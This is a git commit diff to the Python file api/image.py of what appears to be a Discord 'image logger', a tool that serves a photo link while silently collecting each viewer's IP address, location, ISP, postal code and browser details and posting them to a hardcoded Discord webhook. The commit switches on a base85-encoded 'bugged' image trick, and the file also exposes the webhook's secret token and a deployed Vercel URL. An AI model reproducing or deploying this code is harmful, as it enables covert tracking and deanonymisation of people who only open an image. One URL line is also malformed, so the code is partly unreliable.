13e70dc5baf9b1a93b2f87856aaab2a6f087f636
ERIGAWOKH <Ashur_warda@hotmail.com>
2025-05-21 13:17:22 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -4,11 +4,12 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1374499954977935440/Y_P-9aY_Zon-zFp0XlA2Y-esz90GQSrZP-d4XCw1HIa6zF043BGFKZ11X9CEVJmT5GO_'
 image = httpx.get('https://photographylife.com/wp-content/uploads/2018/11/Moeraki-Boulders-New-Zealand.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 
  URL = https://discord-image-logger-one-cyan.vercel.app/API/IMAGE
+
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Fentanyl",
